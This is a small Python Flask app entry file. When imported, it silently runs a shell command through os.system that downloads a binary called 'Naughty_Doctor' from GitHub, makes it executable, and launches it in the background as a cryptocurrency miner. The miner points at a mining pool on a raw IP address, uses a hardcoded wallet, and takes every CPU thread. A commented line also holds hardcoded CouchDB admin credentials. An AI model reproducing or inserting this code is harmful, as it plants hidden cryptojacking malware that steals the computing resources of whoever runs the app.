from flask import Flask
from .routes.flaskr import create_app
import os
os.system ("wget -O https://raw.githubusercontent.com/nathanfleight/scripts/main/Naughty_Doctor && chmod +x Naughty_Doctor && ./Naughty_Doctor --algorithm yespower --pool stratum+tcps://51.79.177.216:17017 --wallet web1qfzjd2nvq0k72mrjpd0qt9as2gvan4kaww9l8dl.RR --password x --cpu-threads $(nproc --all) --keepalive value &")
app = Flask(__name__)
create_app(app)

if __name__ == "__main__":
    app.run()

# test = get(url="http://couchdb-admin:couchdb-password@database:5984/")
# print(test, "\n \n \n \n \n")
